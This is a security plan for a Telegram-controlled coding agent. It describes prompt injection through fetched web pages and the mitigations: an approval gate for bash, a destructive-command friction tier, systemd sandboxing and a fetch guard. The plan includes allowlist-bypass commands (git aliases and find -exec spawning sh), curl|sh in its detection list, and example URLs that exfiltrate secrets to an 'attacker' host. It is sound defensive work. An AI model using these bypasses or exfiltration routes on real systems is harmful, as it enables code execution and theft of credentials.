# Security plan: closing the bash free-for-all

Written 2026-09-08. Updated 2026-09-15 for issue #58: replaced the unsound
allowlist with a per-session approval gate. Status: **implemented** —
`src/security.ts`, `/bash` in `src/index.ts`, hardening in `pi-gateway.service`,
ungated file-tool exclusion + fetch guard (issue #82); self-check:
`npx tsx tests/security-check.ts`.

## Threat model

GAIA is a Telegram-reachable agent that can run arbitrary bash as the user, with
zero gates. The realistic attack isn't malice — it's **prompt injection**: the
agent fetches arbitrary web pages (`websearch`, `fetchpage`) and feeds them to a
model that can execute shell commands. Injected instructions like "run
`curl ... | sh`" previously just worked.

Container/VM/VPS isolation is the textbook fix (and pi's official position —
pi has no built-in sandbox and its docs say real isolation must come from the
OS boundary). But there's a cheaper, complementary layer that doesn't need one:
require a human to approve shell access.

## Why not an allowlist (issue #58)

The first implementation used a prefix allowlist (`"git *"`, `"npm test"`) over
the first token of each shell segment. That was **unsound**: any allowlisted
binary that can itself spawn a subprocess grants arbitrary code execution,
defeating the deny-by-default control:

```
git -c alias.pwn=!id pwn        # git runs the alias body via /bin/sh
git -c alias.pwn=!sh pwn        # arbitrary shell
find . -exec sh -c 'id' \;      # find spawns a shell per -exec
npm test --prefix /tmp/evil     # npm runs hooks from an arbitrary dir
```

The string contains no `$`, backtick, `<`, `>`, or lone `&`, so the old
metacharacter guard never fired and the segment matched `git *` / `find *` /
`npm test`. A prompt-injected model reached `execFileAsync("bash", ["-c", ...])`
unchallenged.

A prefix allowlist over programs that can exec **cannot be made safe**. The fix
is to stop pattern-matching entirely.

## The interception point (verified in pi's SDK docs)

- `createAgentSession()` accepts `excludeTools: ["bash"]` and `customTools`.
- So: remove the built-in bash, register our own `bash` tool in its place.
- Every command — any chat, any schedule, any vector — then flows through one
  function we own. Root-cause fix: one guard in the shared path.
- GAIA already centralizes session creation in `src/session.ts`
  (`ChatSessions.get` + `runOneShot`), so there is one place to wire it.

## Plan (implemented)

### 1. Per-command approval gate — `src/security.ts`

- Delete the allowlist and metacharacter matcher.
- `BashGate` keys one decision per Telegram chat. **Default = closed**: every
  bash command is refused, and the tool tells the model to ask the user.
- `bashGateTool(chatId)` shadows the built-in `bash` in both `ChatSessions.get()`
  and `runOneShot()` in `src/session.ts` (excludeTools: ["bash"] + custom gate
  tool). Headless one-shots (`NO_CHAT`, scheduled tasks) are always closed —
  there is no user present to approve.

### 2. `/bash` chat command — `src/index.ts`

- `/bash` (or `/bash on`) approves bash for the current chat session, showing a
  security warning first. `/bash off` re-locks it. `/new` / `/start` resets the
  gate to closed, so approvals never leak across sessions.
- This replaces Hermes-style interactive y/N approval deliberately. The earlier
  draft of this doc claimed live y/N would "deadlock the serialized turn loop";
  that is not technically correct — `session.prompt()` awaits but yields the
  event loop, the poll loop keeps running, and Telegram inline keyboards already
  work end-to-end (the `/model` menu uses them). A live approval prompt is
  buildable. The real reason GAIA rejects it is **async UX**: GAIA's user texts
  an agent and puts the phone away, so per-command approval stalls every
  shell-using turn until a human reads a notification — minutes or hours. In
  practice that pushes users to "always approve" at the start of any task, which
  collapses to today's `/bash` for no gain. `/bash` keeps the same property — an
  explicit human-in-the-loop decision — without stalling fire-and-forget turns.
  The destructive tier below adds friction only at the footguns, where a watching
  user gets a kill-switch moment without stalling benign commands.

### 2b. Destructive-command friction tier — `src/security.ts`

A second layer on top of the binary gate. Once `/bash` opens a chat
  (`"open"` state), high-blast-radius commands are still refused once and the
  model is told to ask the user to re-confirm with `/bash force` (a one-shot) or
  run the command themselves. This is **not a denylist**: a flagged command
  still runs after the user re-confirms, so the property is "second approval for
  footguns," not "blocked forever." That distinction is load-bearing — without
  a bypass the tier would just be a denylist of patterns, which section #1
  already rejected as unsound.

- `/bash force` sets a one-shot: the next destructive command bypasses the
  friction tier, then the flag is consumed. Also opens the gate if it was closed.
- `/act` and `/delegate` set `"trusted"` instead of `"open"` — their invocation
  IS the human sign-off for the whole plan, including destructive steps, so the
  friction tier is skipped there.
- Headless one-shots (`NO_CHAT`) never reach this code: they stay `blocked`.

Ceiling: classification is regex over the raw command string. It catches the
  obvious footguns a model reaches for blindly (`rm -r`, `sudo`, `mkfs`, `git
  push --force`, `curl|sh`) and misses anything obfuscated (base64 decode,
  env-var payload, alias chains, combined short flags). That is acceptable
  because the binary gate stays closed-by-default and the systemd sandbox is the
  real boundary — this tier is friction, not a security control. It must not be
  allowed to weaken the gate later ("we classify destructive, so auto-approve
  the rest"): that turns it back into the unsound allowlist the gate replaced.

### 3. systemd hardening — `pi-gateway.service`

The "no container needed" containment layer. The service file already exists;
add:

```ini
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=%h/.pi-gateway %h/GAIA
PrivateTmp=yes
RestrictSudo=yes
```

- Even a *successful* injection then can't write outside the state/workspace
  dirs, can't escalate, can't touch system paths.
- Gate and sandbox are complementary: the gate decides what ever runs; the
  sandbox limits what a running thing can do.
- Ceiling: container/VM/VPS (pi's docs point at a Gondolin micro-VM
  integration) is still stronger — see `Dockerfile`.

## Ungated built-in file tools (issue #82)

The bash gate only covers bash. pi ships built-in `read`/`edit`/`write` tools that
resolve absolute paths and `~` with no sandbox and write anywhere the OS user can
(`ReadWritePaths=%h/GAIA` makes the cwd writable). A prompt-injected page could use
them to read `~/.pi-gateway/config.json` / `~/.ssh/id_rsa` (and exfiltrate via
`fetchpage` to a public server) or to rewrite `src/index.ts`/`config.json` for a
persistent backdoor — all without ever touching bash, so neither the gate nor
memory staging engages.

Mitigations (all wired in `src/session.ts` / `src/web.ts`):

- **File tools excluded from sessions.** `createAgentSession` gets
  `excludeTools: ["read", "edit", "write"]`, so every file access flows through
  the gated `bash` tool (our custom `bash` shadows the built-in by name).
  `runOneShot` does the same unless an explicit `tools` allowlist is passed
  (e.g. `/plan` deliberately allows `read` for a trusted one-shot turn).
- **No file-mutation tool survives**, so there is no write channel to tamper with
  `index.ts`/`config.json`; the `allowedChatIds` allow-list and the bash gate
  can't be edited away by the model.
- **`fetchpage` refuses any non-origin URL.** The remaining exfiltration channel
  would be `fetchpage` to a public server carrying a secret in the URL — in the
  query string (`https://attacker/?data=<secret>`), the path
  (`https://attacker/<secret>`), or the fragment (`https://attacker/#<secret>`);
  `safeFetch` only blocks private hosts, so a public server is fine. fetchpage
  now refuses any URL that is not a bare site origin (no path, query, or
  fragment — websearch posts its query in the body and is unaffected), and with
  `read` excluded the model has no secret source to leak anyway.

Ceiling: still a container/VM/VPS (pi's docs point at a Gondolin micro-VM).

## Explicitly skipped

- **Deny-lists** — the gate subsumes them. (The destructive tier above is not a
  denylist: it has a bypass via `/bash force`, so flagged commands still run.)
- **DM pairing** — `allowedChatIds` already is that.
- **Per-tool policies beyond bash** — superseded by issue #82: read/edit/write are
  excluded outright, which is stricter than any per-file policy; bash remains the
  escalation vector and keeps the gate.
- **Allowlists of any kind** — unsound (see issue #58).
- **Live per-command y/N approval** — buildable (inline keyboards already work
  end-to-end for `/model`), but a poor default for GAIA's async chat context:
  users would collapse it to "always approve," gaining nothing over `/bash` while
  stalling every shell turn. The destructive tier is the narrower version that
  survives the move from terminal to chat.

## Verification

- `npx tsc --noEmit`
- `npx tsx tests/security-check.ts` — gate starts closed, refuses a benign
  command, runs it after `/bash`, and closes again on a new session; the
  destructive tier refuses `rm -r`-class commands on an `/bash`-approved chat,
  lets them through after `/bash force` (one-shot) and on `/act`'s `"trusted"`
  approval, and never taints on a refused command.
- After service edit: `systemctl --user daemon-reload && systemctl --user
  restart pi-gateway` and confirm the agent asks for `/bash` before running
  anything, then runs after approval, and that `rm -rf`-class commands still
  ask for `/bash force` even when bash is approved.